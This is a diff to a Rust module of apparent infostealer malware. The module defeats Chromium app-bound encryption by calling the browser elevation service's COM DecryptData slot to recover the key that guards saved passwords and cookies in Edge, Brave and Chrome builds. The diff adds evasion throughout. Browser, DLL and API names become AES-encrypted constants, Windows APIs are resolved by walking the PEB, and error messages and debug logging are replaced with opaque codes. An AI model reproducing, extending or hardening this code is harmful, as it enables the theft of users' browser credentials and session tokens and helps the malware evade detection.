@@ -2,7 +2,28 @@
 #![allow(non_snake_case, non_camel_case_types, dead_code, unused)]
 
 use std::ffi::c_void;
-use crate::xor::{aes_str, CHROME_CLSID_ENV_KEY, CHROME_CLSID_ENV_NONCE, CHROME_CLSID_ENV_CT};
+use crate::xor::{aes_str, aes_dec,
+    CHROME_CLSID_ENV_KEY, CHROME_CLSID_ENV_NONCE, CHROME_CLSID_ENV_CT,
+    API_LOAD_LIBRARY_KEY, API_LOAD_LIBRARY_NONCE, API_LOAD_LIBRARY_CT,
+    API_GET_PROC_KEY, API_GET_PROC_NONCE, API_GET_PROC_CT,
+    DLL_KERNEL32_KEY, DLL_KERNEL32_NONCE, DLL_KERNEL32_CT,
+    DLL_OLE32_KEY, DLL_OLE32_NONCE, DLL_OLE32_CT,
+    DLL_OLEAUT32_KEY, DLL_OLEAUT32_NONCE, DLL_OLEAUT32_CT,
+    API_CO_INIT_KEY, API_CO_INIT_NONCE, API_CO_INIT_CT,
+    API_CO_UNINIT_KEY, API_CO_UNINIT_NONCE, API_CO_UNINIT_CT,
+    API_CO_CREATE_KEY, API_CO_CREATE_NONCE, API_CO_CREATE_CT,
+    API_CO_PROXY_KEY, API_CO_PROXY_NONCE, API_CO_PROXY_CT,
+    API_SYS_ALLOC_KEY, API_SYS_ALLOC_NONCE, API_SYS_ALLOC_CT,
+    API_SYS_FREE_KEY, API_SYS_FREE_NONCE, API_SYS_FREE_CT,
+    API_SYS_LEN_KEY, API_SYS_LEN_NONCE, API_SYS_LEN_CT,
+    EXE_EDGE_KEY, EXE_EDGE_NONCE, EXE_EDGE_CT,
+    EXE_BRAVE_KEY, EXE_BRAVE_NONCE, EXE_BRAVE_CT,
+    EXE_CHROME_KEY, EXE_CHROME_NONCE, EXE_CHROME_CT,
+    CHROME_SXS_KEY, CHROME_SXS_NONCE, CHROME_SXS_CT,
+    CHROME_SXS_PATH_KEY, CHROME_SXS_PATH_NONCE, CHROME_SXS_PATH_CT,
+    CHROME_DEV_KEY, CHROME_DEV_NONCE, CHROME_DEV_CT,
+    CHROME_BETA_KEY, CHROME_BETA_NONCE, CHROME_BETA_CT,
+};
 
 #[repr(C)]
 #[derive(Clone, Copy, Debug)]
@@ -159,20 +180,28 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
         .map(|s| s.to_lowercase())
         .unwrap_or_default();
 
-    if fname == "msedge.exe" {
+    let s_edge   = aes_str(EXE_EDGE_CT,   &EXE_EDGE_KEY,   &EXE_EDGE_NONCE);
+    let s_brave  = aes_str(EXE_BRAVE_CT,  &EXE_BRAVE_KEY,  &EXE_BRAVE_NONCE);
+    let s_chrome = aes_str(EXE_CHROME_CT, &EXE_CHROME_KEY, &EXE_CHROME_NONCE);
+    let s_sxs    = aes_str(CHROME_SXS_CT,      &CHROME_SXS_KEY,      &CHROME_SXS_NONCE);
+    let s_sxsp   = aes_str(CHROME_SXS_PATH_CT, &CHROME_SXS_PATH_KEY, &CHROME_SXS_PATH_NONCE);
+    let s_dev    = aes_str(CHROME_DEV_CT,  &CHROME_DEV_KEY,  &CHROME_DEV_NONCE);
+    let s_beta   = aes_str(CHROME_BETA_CT, &CHROME_BETA_KEY, &CHROME_BETA_NONCE);
+
+    if fname == s_edge {
         return BROWSERS.iter().find(|b| b.name == "Edge");
     }
-    if fname == "brave.exe" {
+    if fname == s_brave {
         return BROWSERS.iter().find(|b| b.name == "Brave");
     }
-    if fname == "chrome.exe" {
-        if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
+    if fname == s_chrome {
+        if exe.contains(&s_sxs) || exe.contains(&s_sxsp) {
             return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
         }
-        if exe.contains("chrome dev") {
+        if exe.contains(&s_dev) {
             return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
         }
-        if exe.contains("chrome beta") {
+        if exe.contains(&s_beta) {
             return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
         }
         if exe.contains("chromium") && !exe.contains("google") {
@@ -259,13 +288,15 @@ unsafe fn force_load(name: &str) -> Option<*mut u8> {
     if let Some(base) = crate::peb::get_module_base(name) {
         return Some(base);
     }
+    let k32_s = aes_str(DLL_KERNEL32_CT, &DLL_KERNEL32_KEY, &DLL_KERNEL32_NONCE);
     let k32 = if !crate::G_K32_BASE.is_null() {
         crate::G_K32_BASE
     } else {
-        crate::peb::get_module_base("kernel32.dll")?
+        crate::peb::get_module_base(&k32_s)?
     };
+    let ll_s = aes_str(API_LOAD_LIBRARY_CT, &API_LOAD_LIBRARY_KEY, &API_LOAD_LIBRARY_NONCE);
     let load_library: FnLoadLibraryA = std::mem::transmute(
-        crate::peb::resolve_export(k32, "LoadLibraryA")?
+        crate::peb::resolve_export(k32, &ll_s)?
     );
     let c_name = std::ffi::CString::new(name).ok()?;
     let base = load_library(c_name.as_ptr());
@@ -275,30 +306,42 @@ unsafe fn force_load(name: &str) -> Option<*mut u8> {
 unsafe fn init_com_apis() -> Option<&'static ComApis> {
     if COM_APIS.is_some() { return COM_APIS.as_ref(); }
 
+    let k32_s2 = aes_str(DLL_KERNEL32_CT, &DLL_KERNEL32_KEY, &DLL_KERNEL32_NONCE);
     let k32 = if !crate::G_K32_BASE.is_null() {
         crate::G_K32_BASE
     } else {
-        crate::peb::get_module_base("kernel32.dll")?
+        crate::peb::get_module_base(&k32_s2)?
     };
-    let load_library_fn: FnLoadLibraryA = std::mem::transmute(crate::peb::resolve_export(k32, "LoadLibraryA")?);
+    let ll_s2 = aes_str(API_LOAD_LIBRARY_CT, &API_LOAD_LIBRARY_KEY, &API_LOAD_LIBRARY_NONCE);
+    let gp_s  = aes_str(API_GET_PROC_CT, &API_GET_PROC_KEY, &API_GET_PROC_NONCE);
+    let load_library_fn: FnLoadLibraryA = std::mem::transmute(crate::peb::resolve_export(k32, &ll_s2)?);
     let get_proc: unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8 = std::mem::transmute(
-        crate::peb::resolve_export(k32, "GetProcAddress")?
+        crate::peb::resolve_export(k32, &gp_s)?
     );
 
-    let ole32_name = std::ffi::CString::new("ole32.dll").ok()?;
+    let ole32_s   = aes_dec(DLL_OLE32_CT,    &DLL_OLE32_KEY,    &DLL_OLE32_NONCE);
+    let oleaut_s  = aes_dec(DLL_OLEAUT32_CT, &DLL_OLEAUT32_KEY, &DLL_OLEAUT32_NONCE);
+    let ci_s      = aes_dec(API_CO_INIT_CT,   &API_CO_INIT_KEY,   &API_CO_INIT_NONCE);
+    let cu_s      = aes_dec(API_CO_UNINIT_CT, &API_CO_UNINIT_KEY, &API_CO_UNINIT_NONCE);
+    let cc_s      = aes_dec(API_CO_CREATE_CT, &API_CO_CREATE_KEY, &API_CO_CREATE_NONCE);
+    let cp_s      = aes_dec(API_CO_PROXY_CT,  &API_CO_PROXY_KEY,  &API_CO_PROXY_NONCE);
+    let sa_s      = aes_dec(API_SYS_ALLOC_CT, &API_SYS_ALLOC_KEY, &API_SYS_ALLOC_NONCE);
+    let sf_s      = aes_dec(API_SYS_FREE_CT,  &API_SYS_FREE_KEY,  &API_SYS_FREE_NONCE);
+    let sl_s      = aes_dec(API_SYS_LEN_CT,   &API_SYS_LEN_KEY,   &API_SYS_LEN_NONCE);
+    let ole32_name   = std::ffi::CString::new(ole32_s).ok()?;
     let ole32 = load_library_fn(ole32_name.as_ptr());
     if ole32.is_null() { return None; }
-    let oleaut_name = std::ffi::CString::new("oleaut32.dll").ok()?;
+    let oleaut_name  = std::ffi::CString::new(oleaut_s).ok()?;
     let oleaut = load_library_fn(oleaut_name.as_ptr());
     if oleaut.is_null() { return None; }
 
-    let ci_name = std::ffi::CString::new("CoInitializeEx").ok()?;
-    let cu_name = std::ffi::CString::new("CoUninitialize").ok()?;
-    let cc_name = std::ffi::CString::new("CoCreateInstance").ok()?;
-    let cp_name = std::ffi::CString::new("CoSetProxyBlanket").ok()?;
-    let sa_name = std::ffi::CString::new("SysAllocStringByteLen").ok()?;
-    let sf_name = std::ffi::CString::new("SysFreeString").ok()?;
-    let sl_name = std::ffi::CString::new("SysStringByteLen").ok()?;
+    let ci_name = std::ffi::CString::new(ci_s).ok()?;
+    let cu_name = std::ffi::CString::new(cu_s).ok()?;
+    let cc_name = std::ffi::CString::new(cc_s).ok()?;
+    let cp_name = std::ffi::CString::new(cp_s).ok()?;
+    let sa_name = std::ffi::CString::new(sa_s).ok()?;
+    let sf_name = std::ffi::CString::new(sf_s).ok()?;
+    let sl_name = std::ffi::CString::new(sl_s).ok()?;
 
     let ci = get_proc(ole32, ci_name.as_ptr());
     let cu = get_proc(ole32, cu_name.as_ptr());
@@ -373,22 +416,22 @@ unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
 
 #[inline(never)]
 unsafe fn call_decrypt_at_slot(punk: *mut c_void, enc: &[u8], slot: usize) -> Result<Vec<u8>, String> {
-    if punk.is_null() { return Err("null punk".into()); }
+    if punk.is_null() { return Err("e30".into()); }
     let vtbl_ptr = *(punk as *const *const c_void);
-    if vtbl_ptr.is_null() { return Err("null vtbl".into()); }
+    if vtbl_ptr.is_null() { return Err("e31".into()); }
     let dec_fn_ptr = *(vtbl_ptr as *const *const c_void).add(slot);
-    if dec_fn_ptr.is_null() { return Err(format!("null DecryptData at slot {slot}")); }
+    if dec_fn_ptr.is_null() { return Err("e32".into()); }
     let dec: FnDec = std::mem::transmute(dec_fn_ptr);
 
-    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
+    let cipher = OwnedBstr::from_bytes(enc).ok_or("e33")?;
     let mut plain: *mut u16 = std::ptr::null_mut();
     let mut last_err: u32 = 0;
     let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
     if hr_d < 0 {
-        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
+        return Err("e34".into());
     }
     let bytes = consume_bstr(plain);
-    if bytes.is_empty() { return Err(format!("empty key at slot {slot}")); }
+    if bytes.is_empty() { return Err("e35".into()); }
     Ok(bytes)
 }
 
@@ -402,14 +445,11 @@ fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
 }
 
 unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
-    crate::step(110, "try_one: init_com_apis");
-    let api = init_com_apis().ok_or("COM APIs not initialized")?;
+    let api = init_com_apis().ok_or("e36")?;
     let mut punk: *mut c_void = std::ptr::null_mut();
-    crate::step(111, &format!("try_one: CoCreateInstance CLSCTX_LOCAL_SERVER"));
     let hr = (api.co_create)(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
-    crate::step(112, &format!("try_one: CoCreateInstance hr=0x{:08X}", hr as u32));
-    if hr < 0 { return Err(format!("CoCreateInstance 0x{hr:08X}")); }
-    if punk.is_null() { return Err("null COM pointer".into()); }
+    if hr < 0 { return Err("e37".into()); }
+    if punk.is_null() { return Err("e38".into()); }
 
     let _ = (api.co_proxy)(
         punk,
@@ -424,7 +464,6 @@ unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Resu
 
     let mut last = String::from("e1");
     for &slot in slots {
-        crate::step(113, &format!("try_one: DecryptData slot {slot}"));
         match call_decrypt_at_slot(punk, enc, slot) {
             Ok(bytes) => {
                 if let Some(key) = normalize_com_key(&bytes) {
@@ -433,7 +472,7 @@ unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Resu
                     rel(punk);
                     return Ok(key);
                 }
-                last = format!("slot {slot}: unexpected length {}", bytes.len());
+                last = "e39".into();
             }
             Err(e) => last = e,
         }
@@ -442,7 +481,7 @@ unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Resu
     let vtbl_ptr = *(punk as *const *const c_void);
     let rel: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*(vtbl_ptr as *const *const c_void).add(2));
     rel(punk);
-    Err(format!("DecryptData failed; last: {last}"))
+    Err("e40".into())
 }
 
 unsafe fn try_browser(browser: &BrowserCom, enc: &[u8]) -> Result<Vec<u8>, String> {
@@ -467,34 +506,24 @@ unsafe fn try_browser(browser: &BrowserCom, enc: &[u8]) -> Result<Vec<u8>, Strin
 
     let mut last = String::new();
     for iid in iids {
-        let iid_str = guid_to_string(iid);
-        crate::step(120, &format!("try_browser: trying IID {}", iid_str));
         match try_one(&clsid, iid, enc, slots) {
-            Ok(key) => {
-                return Ok(key);
-            }
-            Err(e) => {
-                last = e;
-            }
+            Ok(key) => return Ok(key),
+            Err(e)  => last = e,
         }
     }
 
-    Err(format!("{} failed; last: {last}", browser.name))
+    Err("e41".into())
 }
 
 pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
-        crate::step(100, "decrypt_for_browser: init COM apis");
-        let api = init_com_apis().ok_or("COM APIs not init")?;
-        crate::step(101, "decrypt_for_browser: CoInitializeEx");
+        let api = init_com_apis().ok_or("e42")?;
         let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
         let hr_u = hr as u32;
         if hr < 0 && hr_u != 0x0000_0001u32 {
-            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+            return Err("e43".into());
         }
-        crate::step(102, &format!("decrypt_for_browser: trying {}", browser.name));
         let r = try_browser(browser, encrypted_key);
-        crate::step(103, &format!("decrypt_for_browser: result ok={}", r.is_ok()));
         (api.co_uninit)();
         r
     }
@@ -502,20 +531,20 @@ pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result
 
 pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
-        let api = init_com_apis().ok_or("COM APIs not init")?;
+        let api = init_com_apis().ok_or("e44")?;
         let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
         let hr_u = hr as u32;
         if hr < 0 && hr_u != 0x0000_0001u32 {
-            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+            return Err("e45".into());
         }
-        let mut last = String::from("no browser tried");
+        let mut last = String::from("e1");
         for b in BROWSERS {
             match try_browser(b, encrypted_key) {
                 Ok(key) => { (api.co_uninit)(); return Ok(key); }
-                Err(e) => last = format!("{}: {e}", b.name),
+                Err(e)  => last = e,
             }
         }
         (api.co_uninit)();
-        Err(format!("all browsers failed; last: {last}"))
+        Err("e46".into())
     }
 }
